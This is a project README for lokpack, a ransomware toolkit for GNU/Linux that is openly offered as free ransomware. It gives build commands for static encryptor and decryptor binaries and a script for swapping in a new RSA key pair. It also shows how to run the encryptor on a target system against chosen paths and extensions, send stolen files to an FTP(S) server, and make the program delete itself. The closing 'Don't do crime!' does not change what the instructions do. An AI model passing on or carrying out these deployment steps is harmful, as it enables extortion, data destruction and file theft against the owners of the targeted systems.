# lokpack | ransomware tooling for GNU/Linux

![](https://img.shields.io/github/actions/workflow/status/ngn13/lokpack/test.yml?label=tests)
![](https://img.shields.io/github/actions/workflow/status/ngn13/lokpack/release.yml?label=release)

lokpack is a free ransomware for modern GNU/Linux systems, written in C.

![showcase](https://github.com/ngn13/lokpack/assets/78868991/d1d8e490-b7d3-4f21-aeca-368eb0a0a0d8)

## Features

- Build static encryption and decryption tools
- Steal files using a FTP(S) server
- Specify custom target paths and extensions
- Uncrackable encryption with 8192 bit RSA and AES-256
- Fully multi-threaded

## Tested on...

Latest release is automatically tested weekly on the latest Ubuntu LTS using
github actions. I also manually tested the latest release on the following
systems:

- Arch Linux 2025-06-02, x86-64
- Ubuntu 24.04.2 LTS (Noble Numbat), x86-64
- FreeBSD 14.2-RELEASE, i386

If you experience issues on any GNU/Linux system, feel free to create an issue.
This project does not target BSD systems, however if you experience any issues
on popular BSD systems (FreeBSD, NetBSD, OpenBSD etc.) I can try to fix them as
well.

## Installation

### Binary builds

Binary builds (automatically built with github actions) are published for each
release. These releases contain static, cross-compiled built encryptor and
decryptor binaries with a randomly generated RSA key pair.

Each release also contains a simple python(3) patch script, which you can use to
generate a new RSA key pair and replace the pair contained in the binaries:

```bash
# make sure you have pycryptodome installed
python3 patch.py
```

### From the source

#### Setup

- A GNU/Linux system, you may also be able to build on BSD systems
- GCC, GNU make and other GNU build tools
- curl (and headers)
- OpenSSL (and headers)

**If you want to cross-compile the binaries for a different system**, you'll
will need the cross-compilation tools for the target system. **If your distro
does not package cross-compilation tools**, you can build them yourself. After
building them you should specify their paths with environment variables, for
example:

```bash
export CC=/opt/cross/bin/x86_64-linux-gnu-gcc
export LD=/opt/cross/bin/x86_64-linux-gnu-ld
export AS=/opt/cross/bin/x86_64-linux-gnu-as
```

You should also add path of the cross-compilation headers to the include path:

```bash
export C_INCLUDE_PATH=/opt/cross/include
```

**If you want to static binaries**, you will also need static libraries of curl
and OpenSSL. **If your distro does not package these**, you can build them
yourself or use the automated build scripts:

```bash
./scripts/openssl.sh
./scripts/curl.sh
```

#### Build

For a static build (requires static libraries) with a randomly generated RSA key
pair:

```bash
./scripts/build.sh -static
```

For a local build (requires shared libraries) with a randomly generated RSA key
pair:

```bash
./scripts/build.sh -local
```

Both of these should create the `encryptor` and the `decryptor` binaries at
`dist/`.

You can also build the binaries with an hardcoded key pair, and later patch them
using the `patch.py` script, which is located under the scripts directory:

```bash
make
cd dist && python3 ../scripts/patch.py
```

This also let's you customize different build options:

```bash
make LP_QUEUE_MAX=400
```

You can get a full list of these build options by running `make help`.

## Usage

After transferring `encryptor` to the target system, you can specify custom
options:

```bash
$ ./encryptor --help
[*] Listing available options:
    --threads   => Thread count for the thread pool
    --paths     => Target paths (directories/files)
    --exts      => Target file extensions
    --ftp-url   => Address for the FTP(S) server
    --ftp-user  => FTP(S) username
    --ftp-pwd   => FTP(S) password
    --no-ftp    => Disable stealing files with FTP(S)
    --no-bar    => Disable simple ASCII progress bar
    --destruct  => Self destruct (delete) the program
```

For example to encrypt `.sql` and `.db` files located at `/var` and `/home`
without FTP using 100 threads:

```bash
./encryptor --threads=100 --paths=/var,/home --exts=sql,db --no-ftp
```

If you want to encrypt all files with all extensions, use the `--exts` options
with an empty value, so just `--exts=`.

Decryptor does not have any options, you only need to specify a target directory
or a file to decrypt. For example to decrypt all the encrypted files in `/var`,
you can run:

```bash
./decryptor /var
```

### Setting up FTP(S)

For an actual FTP(S) setup you should install and configure a FTP daemon such as
`vsftpd`. But for testing you can use `pyftpdlib`:

```bash
# username and password are 'anonymous'
# which is default for the encryptor
python3 -m pyftpdlib -w
# -w for write access
```

## Development

After making any changes to the source code, make sure the format the code and
check for any linting errors (requires a recent version of `clang-format` and
`clang-tidy`):

```bash
make format # fix formatting
make check # check for formatting and linting errors
```

Make sure the fix any reported issues. Also make sure to test the binaries using
the `scripts/test.sh` script (requires `openssl` and `pyftpdlib`):

```bash
make test
```

If you experience any issues, enable the debug messages, compile the binaries
with debug messages. This might help you to quickly spot the issue:

```bash
make LP_DEBUG=1 # uses hardcoded key pair
# or...
./scripts/build.sh -debug # uses random key pair
```

---

Don't do crime!
